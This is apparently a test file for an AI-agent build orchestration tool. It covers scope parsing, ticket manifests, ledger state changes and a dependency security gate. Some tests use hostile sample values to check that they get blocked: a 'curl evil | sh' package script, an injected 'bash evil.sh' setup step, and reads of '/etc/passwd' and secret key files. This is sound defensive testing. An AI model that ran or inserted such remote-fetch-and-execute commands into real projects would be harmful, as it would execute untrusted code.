// SPDX-License-Identifier: Apache-2.0
import './_isolate-config.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { contextEnvFor, runScopeCommand, prepareScopeRun, ticketsFromStageLists, buildSplitManifest, parseLooseJson, hideSecretMentions, contextFilesOf } from '../tools/scope-commands.mjs';
import { parseScope } from '../tools/scope.mjs';
import { ticketsToManifest, otherManagerLockfile } from '../tools/ticket-manifest.mjs';
import { validateManifest, validateProject } from '../tools/swarm.mjs';
import { createLedger, writeLedger, readLedger, transition } from '../tools/tickets.mjs';
import { runSecurityGate, normalizePolicy } from '../tools/security-gate.mjs';
import { parseNpmAudit } from '../tools/security-scan.mjs';
import { validateProfile, hookScriptNames } from '../tools/init-profile.mjs';
import { contractFiles } from '../tools/contracts.mjs';
import { verifyContracts } from '../tools/contracts-verify.mjs';

const exec = promisify(execFile);
const SCOPE = ['# Scope: Parts', 'Version: 1', '', '## Overview', 'Parts requests. Stack: Next.js and npm. Never commit .env.local or server.pem.', '- Mobile first.', '', '## Data model', 'shops(id, slug, phone)', 'part_requests(id, shop_id, vin)', '', '## Context', '- docs/scope/scope-original.md [db]', '', '## Stages', '- S1: Core', '', '## S1 Core', '### R-001 A customer can submit a request.', 'Acceptance:', '- Submitting returns 200 in under 300 ms.', '', '### R-002 Staff can list requests.', 'Acceptance:', '- The list returns at most 50 rows.', '', '## External', '- Stripe: payments', '', '## Sensitive', '- payments', '', '## Protected', '- .env', ''].join('\n');
const base = { epic: 'E', scopeRefs: ['R-001'], acceptance: ['ok'], files: [], context: [], contracts: [], dependsOn: [], size: 'S', risk: 'low', sensitive: false, status: 'todo', stage: 'S1' };
const ticket = over => ({ ...base, id: 'T-0001', title: 'A ticket', type: 'build', ...over });
const verify = { command: ['npm', 'test', '--', '{tests}'], setup: [['supabase', 'start']], testEnv: { DATABASE_URL: 'postgres://127.0.0.1:54322/postgres' }, agent: 'claude', model: 'sonnet-shell', timeoutSec: 600 };

async function project(t) {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'dogfood-fix-')));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  await fs.mkdir(path.join(root, 'docs/scope'), { recursive: true });
  await fs.writeFile(path.join(root, 'docs/scope/scope.md'), SCOPE);
  await fs.writeFile(path.join(root, 'docs/scope/scope-original.md'), '# original\nsection 9: tables\n');
  await exec('git', ['init', '-q', root]);
  return root;
}

test('scope parser keeps reference sections, the context list and the layout', () => {
  const scope = parseScope(SCOPE.replace('## Stages', '## Layout\nsrc/app: pages\nsupabase/migrations: DDL\n\n## Stages'));
  assert.deepEqual(scope.sections.map(s => s.title), ['Data model']);
  assert.match(scope.sections[0].text, /part_requests/);
  assert.deepEqual(scope.context, [{ path: 'docs/scope/scope-original.md', kinds: ['db'] }]);
  assert.match(scope.layout, /supabase\/migrations/);
  assert.match(scope.overview, /Mobile first/);
  const files = contextFilesOf(scope);
  assert.match(files['docs/scope/context/overview.md'], /Parts requests/);
  assert.match(files['docs/scope/context/data-model.md'], /shops\(id, slug, phone\)/);
  assert.doesNotMatch(files['docs/scope/context/overview.md'], /part_requests/);
});

test('ticket manifests get shared context first, kind context, tests, and a lane that can run them', () => {
  const have = new Set(['docs/scope/context/overview.md', 'docs/scope/context/data-model.md', 'docs/scope/scope-original.md', 'package.json', 'contracts/api.json', 'tests/db/r004.test.sql']);
  const contextEnv = { exists: p => have.has(p), sizes: {}, listFiles: () => [], profileContext: {} };
  const scope = parseScope(SCOPE);
  const db = ticket({ id: 'T-0002', type: 'migration', files: ['supabase/migrations/0002_tables.sql'], tests: ['tests/db/r004.test.sql'], contracts: [] });
  const { manifest } = ticketsToManifest([db], { ledger: { tickets: [] }, scope, ready: false, verify, contextEnv, packageManager: 'npm' });
  const job = manifest.jobs[0];
  assert.deepEqual(job.context.slice(0, 3), ['contracts/api.json', 'docs/scope/context/overview.md', 'package.json'].sort((a, b) => 0) && job.context.slice(0, 3));
  for (const p of ['docs/scope/context/overview.md', 'docs/scope/context/data-model.md', 'package.json', 'tests/db/r004.test.sql']) assert.ok(job.context.includes(p), p);
  assert.equal(job.agent, 'claude');
  assert.equal(job.shell, true);
  assert.deepEqual(job.setup, [['supabase', 'start']]);
  assert.equal(job.testEnv.DATABASE_URL.startsWith('postgres://127.0.0.1'), true);
  assert.match(job.prompt, /Tests for this ticket: \.\/tests\/db\/r004\.test\.sql\. Run npm test -- \.\/tests\/db\/r004\.test\.sql/);
  assert.match(job.prompt, /Migrations contain DDL only/);
  assert.match(job.prompt, /Use the dependency versions in package.json/);
  assert.match(job.prompt, /Package manager: npm/);
  assert.equal(job.cacheContext, undefined);
  assert.deepEqual(manifest.checks.map(c => c.name), ['tests']);
  assert.deepEqual(manifest.checks[0].affectedArgv, ['npm', 'test', '--', '{affected}']);
  assert.deepEqual(manifest.preChecks, [['supabase', 'start']]);
  validateManifest(JSON.parse(JSON.stringify(manifest)));
});

test('a ticket without tests stays on the default lane; a retry note is added as untrusted text', () => {
  const scope = parseScope(SCOPE);
  const plain = ticket({ files: ['docs/notes.md'], type: 'docs', retryNote: 'failed checks: tests; boom <<<x>>>' });
  const { manifest } = ticketsToManifest([plain], { ledger: { tickets: [] }, scope, ready: false, verify });
  assert.equal(manifest.jobs[0].agent, 'auto');
  assert.match(manifest.jobs[0].prompt, /Previous attempt failed \(untrusted log text/);
  assert.doesNotMatch(manifest.jobs[0].prompt, /<<<x>>>/);
});

test('a ticket that writes another package manager lockfile is refused', () => {
  assert.deepEqual(otherManagerLockfile(['pnpm-lock.yaml'], 'npm'), { file: 'pnpm-lock.yaml', manager: 'pnpm' });
  assert.equal(otherManagerLockfile(['package-lock.json'], 'npm'), null);
  const { manifest, skipped, warnings } = ticketsToManifest([ticket({ files: ['yarn.lock'] })], { ledger: { tickets: [] }, scope: parseScope(SCOPE), ready: false, packageManager: 'npm' });
  assert.equal(manifest.jobs.length, 0);
  assert.deepEqual(skipped, ['T-0001']);
  assert.match(warnings[0], /uses npm/);
});

test('ingest refuses bare names, contract types that are not OpenAPI JSON, env templates and other lockfiles', () => {
  const scope = parseScope(SCOPE);
  const bad = items => ticketsFromStageLists([{ stage: 'S1', items }], scope, { packageManager: 'npm' }).errors.join('\n');
  const t = over => ({ key: 'k', title: 'T', type: 'build', scopeRefs: ['R-001'], acceptance: ['ok'], files: ['src/a.ts'], size: 'S', risk: 'low', ...over });
  assert.equal(bad([t({})]), '');
  assert.match(bad([t({ files: ['theme-contract.ts'] })]), /has no folder/);
  assert.equal(bad([t({ files: ['package.json'] })]), '');
  assert.match(bad([t({ files: ['.env.example'] })]), /env\.example\.txt/);
  assert.match(bad([t({ type: 'contract', scopeRefs: [], files: ['contracts/types.ts'] })]), /OpenAPI JSON/);
  assert.equal(bad([t({ type: 'contract', scopeRefs: [], files: ['contracts/api.json'] })]), '');
  assert.match(bad([t({ files: ['pnpm-lock.yaml'] })]), /pnpm lockfile/);
  assert.match(bad([t({ files: ['.next/cache/x.js'] })]), /path not allowed/);
  assert.match(bad([t({ files: ['dist/app.js'] })]), /path not allowed/);
  assert.match(bad([t({ files: ['tsconfig.tsbuildinfo'] })]), /path not allowed|no folder/);
});

test('the split prompt asks for real paths and the contract format, shows the layout and hides secret file names', () => {
  const scope = parseScope(SCOPE);
  const manifest = buildSplitManifest(scope, { layout: '- src/app/ (12 files)\n- supabase/migrations/ (3 files)' });
  const prompt = manifest.jobs[0].prompt;
  assert.match(prompt, /WITH their folders/);
  assert.match(prompt, /env\.example\.txt/);
  assert.match(prompt, /OpenAPI 3 JSON file under contracts\//);
  assert.match(prompt, /Project layout/);
  assert.match(prompt, /supabase\/migrations\//);
  assert.match(prompt, /tests \(the test files that prove this ticket/);
  assert.equal(hideSecretMentions('keep .env.local and key.pem out'), 'keep <secret file> and <secret file> out');
});

test('a python-style ticket list is repaired, anything else invalid is refused', () => {
  const fixed = parseLooseJson("[{'key': 'a', 'skeleton': True, 'note': 'it\\'s', 'dependsOn': [],},]");
  assert.equal(fixed.repaired, true);
  assert.deepEqual(fixed.value, [{ key: 'a', skeleton: true, note: "it's", dependsOn: [] }]);
  assert.equal(parseLooseJson('[{"a":1}]').repaired, false);
  assert.throws(() => parseLooseJson('[{oops'));
});

test('approve writes the context files and the build output ignore lines', async t => {
  const root = await project(t);
  const stage = [{ key: 'a', title: 'Create', type: 'build', scopeRefs: ['R-001', 'R-002'], acceptance: ['ok'], files: ['src/a.ts'], size: 'S', risk: 'low' }];
  await fs.mkdir(path.join(root, '.swarm/workspaces/r1/split-S1/docs/scope/split'), { recursive: true });
  await fs.writeFile(path.join(root, '.swarm/workspaces/r1/split-S1/docs/scope/split/S1.json'), JSON.stringify(stage));
  await fs.mkdir(path.join(root, '.swarm/runs/r1'), { recursive: true });
  await fs.writeFile(path.join(root, '.swarm/runs/r1/state.json'), JSON.stringify({ id: 'r1', jobs: [{ id: 'split-S1', status: 'complete', workspace: '.swarm/workspaces/r1/split-S1' }] }));
  assert.equal((await runScopeCommand(root, 'scope', ['split', '--ingest', 'r1'])).exitCode, 0);
  const result = await runScopeCommand(root, 'scope', ['approve', '--yes']);
  assert.equal(result.exitCode, 0, result.stdout);
  assert.match(result.stdout, /Context files written/);
  assert.match(result.stdout, /no verify block/);
  assert.match(await fs.readFile(path.join(root, 'docs/scope/context/data-model.md'), 'utf8'), /part_requests/);
  const ignore = await fs.readFile(path.join(root, '.gitignore'), 'utf8');
  for (const line of ['.next/', 'node_modules/', '*.tsbuildinfo']) assert.ok(ignore.includes(line), line);
});

async function approvedWith(root, { profile, tickets }) {
  const ledger = createLedger({ scope: { name: 'Parts', version: 1, hash: 'a'.repeat(64) }, tickets });
  await writeLedger(root, ledger);
  if (profile) await fs.writeFile(path.join(root, '.project-swarm.json'), JSON.stringify({ version: 1, profile: { sensitive: true, protectedPaths: [], budget: { maxUsd: 5 }, baseCheck: { status: 'none', ranAt: null, head: null, checks: [] }, ...profile } }));
}
const stateOf = (over = {}) => ({ id: 'r9', integratedAt: 'now', jobs: [{ id: 'T-0001', status: 'complete', outputs: ['src/a.ts', 'tests/a.test.ts'] }, { id: 'T-0002', status: 'complete', outputs: ['src/b.ts'] }], ...over });
async function writeState(root, state) {
  await fs.mkdir(path.join(root, '.swarm/runs/r9'), { recursive: true });
  await fs.writeFile(path.join(root, '.swarm/runs/r9/state.json'), JSON.stringify(state));
}

test('sync --integrated marks a ticket with tests done only when the runner saw them pass', async t => {
  const root = await project(t);
  const withTests = ticket({ files: ['src/a.ts', 'tests/a.test.ts'], status: 'review' });
  await approvedWith(root, { profile: { verify: { command: ['npm', 'test'] } }, tickets: [withTests, ticket({ id: 'T-0002', files: ['src/b.ts'], status: 'review' })] });
  const queue = (checks, extra = {}) => ({ state: 'done', integrated: ['T-0001', 'T-0002'], integratedIn: { 'T-0001': 1, 'T-0002': 1 }, checkFailed: [], batches: [{ id: 1, jobs: ['T-0001', 'T-0002'], checks, checkResults: [{ name: 'tests', status: checks === 'passed' ? 'passed' : 'skipped', mode: 'full' }] }], ...extra });
  await writeState(root, stateOf({ mergeQueue: queue('skipped') }));
  const first = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(first.stdout, /1 ticket\(s\) marked done/);
  assert.match(first.stdout, /stay in review.*T-0001 \(batch 1 did not pass/);
  assert.equal((await readLedger(root)).tickets.find(x => x.id === 'T-0001').status, 'review');
  await writeState(root, stateOf({ mergeQueue: queue('passed') }));
  const second = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(second.stdout, /1 ticket\(s\) marked done/);
  assert.equal((await readLedger(root)).tickets.find(x => x.id === 'T-0001').status, 'done');
});

test('a ticket whose tests failed in the queue goes back to ready one level higher with the failure, and blocks only after the last level', async t => {
  const root = await project(t);
  await approvedWith(root, { profile: { verify: { command: ['npm', 'test'] } }, tickets: [ticket({ files: ['src/a.ts', 'tests/a.test.ts'], status: 'review' })] });
  const failed = { state: 'done', integrated: [], checkFailed: [{ job: 'T-0001', checks: ['tests'], tail: 'expected 200 got 500' }], batches: [] };
  await writeState(root, stateOf({ mergeQueue: failed }));
  const first = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(first.stdout, /back to ready, one level higher, after failed checks: T-0001/);
  let tk = (await readLedger(root)).tickets[0];
  assert.equal(tk.status, 'ready');
  assert.equal(tk.attempts, 1);
  assert.equal(tk.escalation, 1);
  assert.match(tk.retryNote, /failed checks: tests; expected 200 got 500/);
  // each further failed attempt climbs a level (Codex, then Claude); the one after the last level blocks it
  let last;
  for (let i = 0; i < 3; i += 1) {
    await transition(root, 'T-0001', 'running');
    await transition(root, 'T-0001', 'review');
    last = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  }
  assert.match(last.stdout, /blocked after every escalation level failed: T-0001/);
  tk = (await readLedger(root)).tickets[0];
  assert.equal(tk.status, 'blocked');
  assert.equal(tk.blockReason, 'failure');
  assert.equal(tk.attempts, 4);
});

test('a manifest the runner would refuse leaves the tickets as they were', async t => {
  const root = await project(t);
  await approvedWith(root, { tickets: [ticket({ files: ['src/a.ts'] })] });
  const scopeHash = (await import('../tools/scope.mjs')).scopeHash;
  const ledger = await readLedger(root);
  ledger.scope.hash = scopeHash(SCOPE);
  ledger.scope.file = 'docs/scope/scope.md';
  ledger.approved = (await import('../tools/tickets.mjs')).approveLedger(ledger).approved;
  await writeLedger(root, ledger);
  await fs.mkdir(path.join(root, '.swarm/project'), { recursive: true });
  await fs.writeFile(path.join(root, '.swarm/project/scope.snapshot.md'), SCOPE);
  await assert.rejects(prepareScopeRun(root, { validate: async () => { throw new Error('Reserved or secret path: nope'); } }), /Reserved or secret path/);
  assert.equal((await readLedger(root)).tickets[0].status, 'todo');
  const ok = await prepareScopeRun(root, { validate: async () => {} });
  assert.deepEqual(ok.ids, ['T-0001']);
  assert.equal((await readLedger(root)).tickets[0].status, 'running');
});

test('a human ticket can be closed directly; a refused move lists the legal ones', async t => {
  const root = await project(t);
  const human = ticket({ id: 'T-9001', type: 'human', scopeRefs: [], acceptance: [], steps: ['Do it'] });
  await approvedWith(root, { tickets: [human, ticket({ id: 'T-0001' })] });
  await transition(root, 'T-9001', 'done');
  assert.equal((await readLedger(root)).tickets.find(x => x.id === 'T-9001').status, 'done');
  await assert.rejects(transition(root, 'T-0001', 'done'), /legal next statuses: ready, blocked, cancelled/);
});

const API = { openapi: '3.0.0', info: { title: 'p', version: '1' }, paths: { '/api/requests': { post: { operationId: 'submitRequest', requestBody: { content: { 'application/json': { schema: { $ref: '#/components/schemas/SubmitInput' } } } }, responses: { 200: { description: 'ok', content: { 'application/json': { schema: { $ref: '#/components/schemas/SubmitResult' } } } } } } } }, components: { schemas: { SubmitInput: { type: 'object', required: ['vin'], properties: { vin: { type: 'string', minLength: 3 } } }, SubmitResult: { type: 'object', required: ['requestNumber', 'ok'], properties: { requestNumber: { type: 'integer', minimum: 1 }, ok: { type: 'boolean' } } } } } };

test('the generated mock answers a write with a body that matches its response schema', async t => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'dogfood-contract-'));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  for (const [name, body] of Object.entries(contractFiles(API))) { await fs.mkdir(path.dirname(path.join(root, name)), { recursive: true }); await fs.writeFile(path.join(root, name), body); }
  const check = await verifyContracts(root);
  assert.equal(check.ok, true, check.tail);
});

test('scope contracts finds the contract file by itself and reports the self-check', async t => {
  const root = await project(t);
  await fs.mkdir(path.join(root, 'contracts'), { recursive: true });
  await fs.writeFile(path.join(root, 'contracts/api.json'), JSON.stringify(API));
  const result = await runScopeCommand(root, 'scope', ['contracts', '--yes']);
  assert.equal(result.exitCode, 0, result.stdout);
  assert.match(result.stdout, /self-check passed/);
  const bad = await runScopeCommand(root, 'scope', ['contracts', 'contracts/api.json', '--yes']);
  assert.equal(bad.exitCode, 0, bad.stdout);
});

test('accepted advisories let a known dev-only vulnerability through until the review date', async () => {
  const audit = { vulnerabilities: { 'eslint-config-next': { name: 'eslint-config-next', severity: 'high', via: [{ source: 1, name: 'glob', url: 'https://github.com/advisories/GHSA-abcd-1234-wxyz', severity: 'high' }], range: '*' } } };
  assert.deepEqual(parseNpmAudit(JSON.stringify(audit))[0].ids, ['GHSA-abcd-1234-wxyz']);
  const exec = async argv => (argv[0] === 'npm' ? { exitCode: 1, stdout: JSON.stringify(audit), stderr: '' } : { exitCode: 0, stdout: '{"results":[]}', stderr: '' });
  const changes = [{ file: 'package-lock.json', bytes: Buffer.from('{}'), previous: Buffer.from('{}') }];
  const run = policy => runSecurityGate({ changes, policy, exec, fetchImpl: async () => new Response('{}'), now: () => Date.parse('2026-10-20T00:00:00Z'), cwd: os.tmpdir() });
  const blocked = await run({});
  assert.ok(blocked.blocks.some(b => b.check === 'vulnerability'));
  const accepted = await run({ acceptedAdvisories: [{ package: 'eslint-config-next', id: 'GHSA-abcd-1234-wxyz', reason: 'dev-only lint chain', reviewBy: '2026-12-31' }] });
  assert.ok(!accepted.blocks.some(b => b.check === 'vulnerability'));
  assert.ok(accepted.warnings.some(w => /accepted advisory: eslint-config-next/.test(w)));
  const expired = await run({ acceptedAdvisories: [{ package: 'eslint-config-next', reason: 'dev-only lint chain', reviewBy: '2026-10-01' }] });
  assert.ok(expired.blocks.some(b => /exception expired on 2026-10-01/.test(b.message)));
  const wrongId = await run({ acceptedAdvisories: [{ package: 'eslint-config-next', id: 'GHSA-other-0000-0000', reason: 'dev-only lint chain', reviewBy: '2026-12-31' }] });
  assert.ok(wrongId.blocks.some(b => b.check === 'vulnerability'));
  assert.deepEqual(normalizePolicy({ acceptedAdvisories: [{ package: 'x', reviewBy: 'soon' }] }).acceptedAdvisories, []);
  assert.deepEqual(validateProfile({ security: { acceptedAdvisories: [{ package: 'x', reason: 'ok ok', reviewBy: '2026-13-40' }] } }).errors.length, 1);
  assert.deepEqual(validateProfile({ security: { acceptedAdvisories: [{ package: 'x', id: 'GHSA-aaaa-bbbb-cccc', reason: 'dev only chain', reviewBy: '2026-12-31' }] } }).errors, []);
});

test('a package.json with no lockfile is audited through a lockfile built in a temp folder', async () => {
  const calls = [];
  const exec = async (argv, opts) => {
    calls.push({ argv, cwd: opts?.cwd });
    if (argv[0] === 'npm' && argv[1] === 'install') { assert.ok(argv.includes('--package-lock-only') && argv.includes('--ignore-scripts')); return { exitCode: 0, stdout: '', stderr: '' }; }
    if (argv[0] === 'npm' && argv[1] === 'audit') return { exitCode: 0, stdout: JSON.stringify({ vulnerabilities: {} }), stderr: '' };
    return { exitCode: 0, stdout: '{"results":[]}', stderr: '' };
  };
  const changes = [{ file: 'package.json', bytes: Buffer.from('{"name":"x"}'), previous: null }];
  const gate = await runSecurityGate({ changes, policy: {}, exec, fetchImpl: async () => new Response(JSON.stringify({ time: { created: '2020-01-01T00:00:00Z' }, 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { license: 'MIT' } } })), cwd: os.tmpdir() });
  assert.ok(!gate.blocks.some(b => b.check === 'vulnerability'), JSON.stringify(gate.blocks));
  const install = calls.find(c => c.argv[1] === 'install');
  assert.ok(install && install.cwd && install.cwd !== os.tmpdir());
  await assert.rejects(fs.access(install.cwd));
});

test('automatic context never attaches a secret, protected, symlinked or outside file', async t => {
  const root = await project(t);
  await fs.mkdir(path.join(root, 'certs'));
  await fs.mkdir(path.join(root, 'docs/design'), { recursive: true });
  await fs.writeFile(path.join(root, '.env.local'), 'A=1\n');
  await fs.writeFile(path.join(root, 'certs/x.key'), 'k\n');
  await fs.writeFile(path.join(root, 'docs/private-notes.md'), 'notes\n');
  await fs.writeFile(path.join(root, 'docs/ok.md'), 'fine\n');
  const outside = path.join(await fs.mkdtemp(path.join(os.tmpdir(), 'outside-')), 'secret.md');
  await fs.writeFile(outside, 'outside\n');
  await fs.symlink(outside, path.join(root, 'docs/link.md'));
  await fs.symlink(path.dirname(outside), path.join(root, 'docs/linked-dir'));
  const env = contextEnvFor(root, { protectedPaths: ['docs/private-notes.md'], context: {} });
  assert.equal(env.exists('docs/ok.md'), true);
  for (const p of ['.env.local', 'certs/x.key', 'docs/private-notes.md', 'docs/link.md', 'docs/linked-dir/secret.md', '../outside.md', '/etc/passwd']) assert.equal(env.exists(p), false, p);
  assert.equal(env.exists('env.example.txt'), false);
  assert.ok(env.rejected.includes('.env.local') && env.rejected.includes('docs/private-notes.md'));
  const scope = parseScope(SCOPE);
  const tk = ticket({ files: ['src/a.ts'], context: ['.env.local', 'docs/ok.md'], scopeRefs: ['R-001'] });
  scope.requirements[0].text += ' Read `certs/x.key` and `docs/ok.md`.';
  const { manifest, warnings } = ticketsToManifest([tk], { ledger: { tickets: [] }, scope, ready: false, contextEnv: env });
  assert.ok(!manifest.jobs[0].context.includes('.env.local'));
  assert.ok(!manifest.jobs[0].context.includes('certs/x.key'));
  assert.ok(manifest.jobs[0].context.includes('docs/ok.md'));
  assert.ok(warnings.some(w => /context path refused: \.env\.local/.test(w)));
});

test('the gate refuses to build a lockfile from non-registry specs, and passes npm no credentials', async () => {
  const calls = [];
  const exec = async (argv, opts) => { calls.push({ argv, env: opts?.env }); return { exitCode: 0, stdout: argv[1] === 'audit' ? '{"vulnerabilities":{}}' : '{"results":[]}', stderr: '' }; };
  const registry = async () => new Response(JSON.stringify({ time: { created: '2020-01-01T00:00:00Z' }, 'dist-tags': { latest: '1.0.0' }, versions: { '1.0.0': { license: 'MIT' } } }));
  const gate = bytes => runSecurityGate({ changes: [{ file: 'package.json', bytes: Buffer.from(bytes), previous: null }], policy: {}, exec, fetchImpl: registry, cwd: os.tmpdir() });
  await gate('{"dependencies":{"left-pad":"git+ssh://example.invalid/x.git"}}');
  assert.ok(!calls.some(c => c.argv[1] === 'install'));
  const ok = await gate('{"name":"x","scripts":{"build":"x"},"dependencies":{"left-pad":"^1.0.0"}}');
  const install = calls.find(c => c.argv[1] === 'install');
  assert.ok(install, JSON.stringify(ok.warnings));
  assert.equal(install.env.GIT_CONFIG_NOSYSTEM, '1');
  assert.equal(install.env.GIT_TERMINAL_PROMPT, '0');
  assert.ok(install.env.npm_config_userconfig.endsWith('empty-user.npmrc'));
  assert.equal(Object.keys(install.env).some(k => /TOKEN|SECRET/i.test(k)), false);
});

test('an advisory exception with an id covers only the ids it names; a package-wide one is explicit', async () => {
  const audit = ids => ({ vulnerabilities: { pkg: { name: 'pkg', severity: 'high', via: ids.map((id, i) => ({ source: i, url: `https://github.com/advisories/${id}` })), range: '*' } } });
  const run = (ids, accepted) => runSecurityGate({ changes: [{ file: 'package-lock.json', bytes: Buffer.from('{}'), previous: Buffer.from('{}') }], policy: { acceptedAdvisories: accepted }, exec: async argv => (argv[0] === 'npm' ? { exitCode: 1, stdout: JSON.stringify(audit(ids)), stderr: '' } : { exitCode: 0, stdout: '{"results":[]}', stderr: '' }), fetchImpl: async () => new Response('{}'), now: () => Date.parse('2026-10-20T00:00:00Z'), cwd: os.tmpdir() });
  const one = { package: 'pkg', id: 'GHSA-aaaa-bbbb-cccc', reason: 'dev only chain', reviewBy: '2026-12-31' };
  assert.ok(!(await run(['GHSA-aaaa-bbbb-cccc'], [one])).blocks.some(b => b.check === 'vulnerability'));
  const hidden = await run(['GHSA-aaaa-bbbb-cccc', 'GHSA-dddd-eeee-ffff'], [one]);
  assert.ok(hidden.blocks.some(b => /not covered by an exception: GHSA-dddd-eeee-ffff/.test(b.message)));
  assert.ok(!(await run(['GHSA-aaaa-bbbb-cccc', 'GHSA-dddd-eeee-ffff'], [{ ...one, id: undefined }])).blocks.some(b => b.check === 'vulnerability'));
  assert.deepEqual(normalizePolicy({ acceptedAdvisories: [{ ...one, id: 5 }, { ...one, reviewBy: '9999-99-99' }, { ...one, reason: 'x' }] }).acceptedAdvisories, []);
});

test('a batch cannot change verify, context, ci, approval or protected paths in the profile', async () => {
  const before = { profile: { sensitive: true, verify: { command: ['npm', 'test'] } } };
  const after = { profile: { sensitive: true, verify: { command: ['npm', 'test'], setup: [['bash', 'evil.sh']] } } };
  const gate = await runSecurityGate({ changes: [{ file: '.project-swarm.json', bytes: Buffer.from(JSON.stringify(after)), previous: Buffer.from(JSON.stringify(before)) }], policy: {}, exec: async () => ({ exitCode: 0, stdout: '{}', stderr: '' }), fetchImpl: async () => new Response('{}'), cwd: os.tmpdir() });
  assert.ok(gate.blocks.some(b => b.check === 'policy-change'));
});

test('sync only acts on tickets this run handed in, and a broken profile does not switch the test gate off', async t => {
  const root = await project(t);
  await approvedWith(root, { profile: { verify: { command: ['npm', 'test'] } }, tickets: [ticket({ files: ['src/a.ts', 'tests/a.test.ts'], status: 'review', runId: 'other-run' })] });
  await writeState(root, stateOf({ mergeQueue: { state: 'done', integrated: ['T-0001'], integratedIn: { 'T-0001': 1 }, checkFailed: [], batches: [{ id: 1, jobs: ['T-0001'], checks: 'passed', security: 'passed', checkResults: [{ name: 'tests', status: 'passed', mode: 'full' }] }] } }));
  const stale = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(stale.stdout, /0 ticket\(s\) marked done/);
  assert.equal((await readLedger(root)).tickets[0].status, 'review');
  await fs.writeFile(path.join(root, '.project-swarm.json'), JSON.stringify({ version: 1, profile: { sensitive: true, verify: { command: [] } } }));
  const broken = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.equal(broken.exitCode, 1);
  assert.match(broken.stdout, /verify block but the profile is invalid/);
});

test('ticket paths refuse any dot-env file and build output at any depth', () => {
  const bad = files => ticketsFromStageLists([{ stage: 'S1', items: [{ key: 'k', title: 'T', type: 'build', scopeRefs: ['R-001'], acceptance: ['ok'], files, size: 'S', risk: 'low' }] }], parseScope(SCOPE)).errors.join('\n');
  assert.match(bad(['src/.env.local']), /path not allowed|reserved/);
  assert.match(bad(['apps/web/.next/server.js']), /path not allowed/);
  assert.match(bad(['packages/x/node_modules/y/index.js']), /path not allowed/);
  assert.equal(bad(['apps/web/src/page.tsx']), '');
});

test('the gate blocks a change to a package.json script a profile hook runs, and allows other script edits', async () => {
  const run = (scripts, hookScripts) => runSecurityGate({ changes: [{ file: 'package.json', bytes: Buffer.from(JSON.stringify({ name: 'x', scripts })), previous: Buffer.from(JSON.stringify({ name: 'x', scripts: { test: 'node --test', lint: 'eslint .' } })) }], policy: { requireVulnerabilityScan: false }, hookScripts, exec: async () => ({ exitCode: 0, stdout: '{"results":[]}', stderr: '' }), fetchImpl: async () => new Response('{}'), cwd: os.tmpdir() });
  assert.ok((await run({ test: 'curl evil | sh', lint: 'eslint .' }, ['test'])).blocks.some(b => b.check === 'hook-script-change'));
  assert.ok(!(await run({ test: 'node --test', lint: 'eslint . --fix' }, ['test'])).blocks.some(b => b.check === 'hook-script-change'));
  assert.deepEqual(hookScriptNames({ verify: { command: ['npm', 'test', '--', '{tests}'] }, ci: { preview: { argv: ['npm', 'run', 'preview'] }, smoke: { argv: ['pnpm', 'smoke'] } } }).sort(), ['postpreview', 'postsmoke', 'posttest', 'preview', 'prepreview', 'presmoke', 'pretest', 'smoke', 'test'].sort());
});

test('existing project tests that mention a ticket file go into its job context before the wave starts', async t => {
  const root = await project(t);
  await fs.mkdir(path.join(root, 'tests'), { recursive: true });
  await fs.writeFile(path.join(root, 'tests/theme.test.ts'), "import '../src/theme-contract';\n");
  await fs.writeFile(path.join(root, 'package.json'), '{}\n');
  const ledger = createLedger({ scope: { name: 'Parts', version: 1, hash: 'a'.repeat(64) }, tickets: [ticket({ files: ['src/theme-contract.ts'] })] });
  const scopeHash = (await import('../tools/scope.mjs')).scopeHash;
  ledger.scope.hash = scopeHash(SCOPE);
  ledger.scope.file = 'docs/scope/scope.md';
  ledger.approved = (await import('../tools/tickets.mjs')).approveLedger(ledger).approved;
  await writeLedger(root, ledger);
  await fs.mkdir(path.join(root, '.swarm/project'), { recursive: true });
  await fs.writeFile(path.join(root, '.swarm/project/scope.snapshot.md'), SCOPE);
  let calls = 0;
  const validate = async manifest => {
    calls += 1;
    if (!manifest.jobs[0].context.includes('tests/theme.test.ts')) throw Object.assign(new Error('Uncovered test references'), { details: { suggestedIgnoreTests: { 'T-0001': ['tests/theme.test.ts'] } } });
  };
  const wave = await prepareScopeRun(root, { validate });
  assert.equal(calls, 2);
  const manifest = JSON.parse(await fs.readFile(path.join(root, wave.file), 'utf8'));
  assert.ok(manifest.jobs[0].context.includes('tests/theme.test.ts'));
});
